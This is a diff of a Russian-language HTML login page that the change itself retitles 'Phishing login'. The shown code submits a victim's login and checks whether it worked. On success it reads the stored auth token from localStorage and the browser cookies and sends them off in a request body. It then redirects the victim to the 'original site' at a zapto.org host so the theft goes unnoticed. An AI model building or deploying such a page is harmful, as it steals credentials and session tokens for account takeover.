@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Войти</title>
+  <title>Фишинг логин</title>
   <style>
     body { font-family: sans-serif; padding: 30px; text-align: center; }
     input, button { padding: 10px; margin: 10px; width: 250px; }
@@ -39,12 +39,10 @@
         });
 
         const text = await res.text();
-
-        // УСПЕШНЫЙ вход, если НЕТ слова "Неверный"
         const isSuccess = !text.toLowerCase().includes("неверный");
 
         if (isSuccess) {
-          // Подождать немного, чтобы token успел записаться в localStorage
+          // подождать, чтобы token успел сохраниться в localStorage
           setTimeout(async () => {
             const token = localStorage.getItem("token");
             const cookies = document.cookie;
@@ -62,13 +60,12 @@
               })
             });
 
-            // Переход на index.php
+            // переходим на оригинальный сайт
             window.location.href = "https://kazcyber.zapto.org/index.php";
-          }, 500); // задержка 0.5 сек для гарантии
+          }, 700);
         } else {
           errorMsg.textContent = "❌ Неверный логин или пароль";
         }
-
       } catch (err) {
         errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
       }
